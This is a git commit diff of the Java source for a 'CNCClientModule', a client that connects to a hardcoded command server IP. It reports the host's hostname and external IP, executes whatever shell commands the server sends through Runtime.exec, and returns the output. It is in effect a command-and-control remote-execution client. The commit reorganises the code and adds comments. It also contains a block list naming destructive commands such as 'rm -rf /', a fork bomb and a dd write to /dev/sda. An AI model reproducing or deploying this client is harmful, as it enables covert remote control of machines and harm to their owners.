27acac45507c981fe76d529a1736dcfa47bd158d
Kaveen Kumarasinghe <ocfinancesmc@gmail.com>
2019-06-24 19:48:20 -0400

    Cleaned up code and added comments

--- src/main/java/Main.java
+++ src/main/java/Main.java
@@ -14,22 +14,18 @@ import java.util.Timer;
 import java.util.TimerTask;
 
 public class Main {
-    private static final String COMMANDIP = "178.128.228.52";
+    //Adjust this accordingly to limit/unlimit the amount of data that can be sent to command in the form of a CommandResponse.
+    public static final int WRITEBUFFER = 50 * 1024;
     private static final int COMMANDPORT = 80;
-    static Client client;
-    private static boolean authenticated = false;
 
+    static Client client;
+
+    private static boolean authenticated = false;
+    public static final int OBJECTBUFFER = 50 * 1024;
+    //List of classes to be registered with kryo for (de)serialization
+    public static final List<Class> KRYO_CLASSES = Arrays.asList(AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class);
     public static final String ANSI_RESET = "\u001B[0m";
     public static final String ANSI_BLACK = "\u001B[30m";
-    public static final String ANSI_RED = "\u001B[31m";
-    public static final String ANSI_GREEN = "\u001B[32m";
-    public static final String ANSI_YELLOW = "\u001B[33m";
-    public static final String ANSI_BLUE = "\u001B[34m";
-    public static final String ANSI_PURPLE = "\u001B[35m";
-    public static final String ANSI_CYAN = "\u001B[36m";
-    public static final String ANSI_WHITE = "\u001B[37m";
-    public static List<String> blockedCommands = Arrays.asList("rm -rf /", "rm -rf /home", ":(){ :|:& };:", "shutdown", "> /dev/sda", "/dev/null", "/dev/sda", "dd if=/dev/random of=/dev/sda", "/dev/random", "/root/,ssh", "ssh-copy-id", "ssh");
-
 
     public static void main(String[] args) {
         initialize();
@@ -37,21 +33,59 @@ public class Main {
 
     }
 
-    private static void registerClasses() {
-        Kryo kryo = client.getKryo();
-        kryo.register(RegisterRequest.class);
-        kryo.register(AuthenticationConfirmation.class);
-        kryo.register(KeepAlive.class);
-        kryo.register(Command.class);
-        kryo.register(CommandResponse.class);
-        log("Registered kryonet classes");
+    public static final String ANSI_RED = "\u001B[31m";
+    public static final String ANSI_GREEN = "\u001B[32m";
+    public static final String ANSI_YELLOW = "\u001B[33m";
+    public static final String ANSI_BLUE = "\u001B[34m";
+
+    private static RegisterRequest craftRegisterRequest() {
+        String hostname = "null";
+        String ipAddress = "null";
+        try {
+            hostname = InetAddress.getLocalHost().getHostName();
+        } catch (Exception e) {
+            e.printStackTrace();
+            error("Unable to obtain hostname");
+            System.exit(0);
+        }
+        try {
+            ipAddress = getIp();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            error("Unable to obtain host address");
+            System.exit(0);
+        }
+        return new RegisterRequest(hostname, ipAddress);
+
+
     }
+
+    public static final String ANSI_PURPLE = "\u001B[35m";
+    public static final String ANSI_CYAN = "\u001B[36m";
+    public static final String ANSI_WHITE = "\u001B[37m";
+    /**
+     * @title CNCClientModule
+     * @author Kaveen Kumarasinghe
+     * @date 06/24/2019
+     * <p>
+     * This is the counterpart of the CNCCommandModule. This client connects to, and receives commands from the CNCCM at https://github.com/Kav-K/CNCCommandModule
+     * <p>
+     * This project uses the KryoNet library from EsotericSoftware (https://github.com/EsotericSoftware/kryonet)
+     * Please keep in mind that KryoNet is built upon Java NIO, and has a (mostly) asynchronous approach to message transmission and reception.
+     */
+
+
+    //The COMMANDIP and COMMANDPORT designate the public, forward-facing ipv4 address and port of the CNCCommandModule server.
+    private static final String COMMANDIP = "178.128.228.52";
+    //TODO More substantial way to block unsafe commands
+    public static List<String> blockedCommands = Arrays.asList("rm -rf /", "rm -rf /home", ":(){ :|:& };:", "shutdown", "> /dev/sda", "/dev/null", "/dev/sda", "dd if=/dev/random of=/dev/sda", "/dev/random", "/root/,ssh", "ssh-copy-id", "ssh");
 
     private static void initialize() {
 
 
         log("Initializing client");
-        client = new Client();
+        client = new Client(WRITEBUFFER, OBJECTBUFFER);
         client.start();
         try {
             log("Connecting client to command");
@@ -64,6 +98,10 @@ public class Main {
             error("Unable to connect to command");
             System.exit(0);
         }
+        /*
+        This listener functions as an authentication confirmation receiver, and as well as a makeshift status checker for the command server.
+        coupled together with startKeepAliveCheck()
+         */
         client.addListener(new Listener() {
             public void received(Connection connection, Object object) {
                 if (object instanceof AuthenticationConfirmation) {
@@ -83,11 +121,9 @@ public class Main {
 
     }
 
-    public static String executeCommand(String cmd) throws java.io.IOException {
-        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
-        return s.hasNext() ? s.next() : "";
-    }
-
+    /*
+    Listens for commands sent from the command server and attempts to execute them, returns a CommandResponse.
+     */
     private static void startCommandListener() {
 
         client.addListener(new Listener() {
@@ -114,6 +150,7 @@ public class Main {
                         client.sendTCP(new CommandResponse(output));
 
                     } catch (Exception e) {
+                        e.printStackTrace();
                         error(e.getMessage());
                         error("Could not execute command: " + command.getCommand());
 
@@ -126,8 +163,11 @@ public class Main {
 
     }
 
+    /*
+    Check the status of the authenticated variable, and if it is false, start the reconnection task to attempt constant
+    reconnections to the server. If it is set to true set it to false and let it be updated back to true by the command server
+     */
     private static void startKeepAliveCheck() {
-        //TODO timer that checks for keep alive packets from the server and  shuts donw if it doesn't see any!
         Timer timer = new Timer("Timer");
         log("Starting authentication checker");
         TimerTask task = new TimerTask() {
@@ -150,20 +190,25 @@ public class Main {
 
         };
 
+        //TODO More substantial way of handling these timers, but it works flawlessly for now.
         timer.scheduleAtFixedRate(task, 2000, 5000);
 
 
     }
 
+    /*
+    A duplicate of initialize() inside a task, attempts reconnection with the command server if it was down.
+     */
     private static void startReconnectionThread() {
-        //TODO Start repeating task that keeps trying to reconnect to the command if authenticated == false
+
         Timer timer = new Timer("Timer");
         TimerTask task = new TimerTask() {
             public void run() {
                 try {
+                    //This is a duplicate of initialize and will be cleaned up later
                     client.close();
                     client.stop();
-                    client = new Client();
+                    client = new Client(WRITEBUFFER, OBJECTBUFFER);
                     client.start();
                     registerClasses();
                     client.connect(3000, COMMANDIP, COMMANDPORT);
@@ -200,29 +245,6 @@ public class Main {
 
     }
 
-    private static RegisterRequest craftRegisterRequest() {
-        String hostname = "null";
-        String ipAddress = "null";
-        try {
-            hostname = InetAddress.getLocalHost().getHostName();
-        } catch (Exception e) {
-            e.printStackTrace();
-            error("Unable to obtain hostname");
-            System.exit(0);
-        }
-        try {
-            ipAddress = getIp();
-
-        } catch (Exception e) {
-            e.printStackTrace();
-            error("Unable to obtain host address");
-            System.exit(0);
-        }
-        return new RegisterRequest(hostname, ipAddress);
-
-
-    }
-
     public static void log(String message) {
         System.out.println(ANSI_GREEN + "[Client] " + ANSI_RESET + message);
     }
@@ -235,6 +257,10 @@ public class Main {
         System.out.println(ANSI_BLUE + "[RECEIVED COMMAND] " + ANSI_RESET + message);
     }
 
+    /*
+    It is required to use an external service like amazonaws because it is not possible to programatically obtain the external ipv4
+    address of a machine under NAT
+     */
     public static String getIp() throws Exception {
         URL whatismyip = new URL("http://checkip.amazonaws.com");
         BufferedReader in = null;
@@ -253,4 +279,17 @@ public class Main {
             }
         }
     }
+
+    public static String executeCommand(String cmd) throws java.io.IOException {
+        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
+        return s.hasNext() ? s.next() : "";
+    }
+
+    private static void registerClasses() {
+        log("Registering classes for serialization/deserialization with kryo");
+        Kryo kryo = client.getKryo();
+        for (Class c : KRYO_CLASSES) kryo.register(c);
+        log("Registered kryo classes");
+    }
+
 }
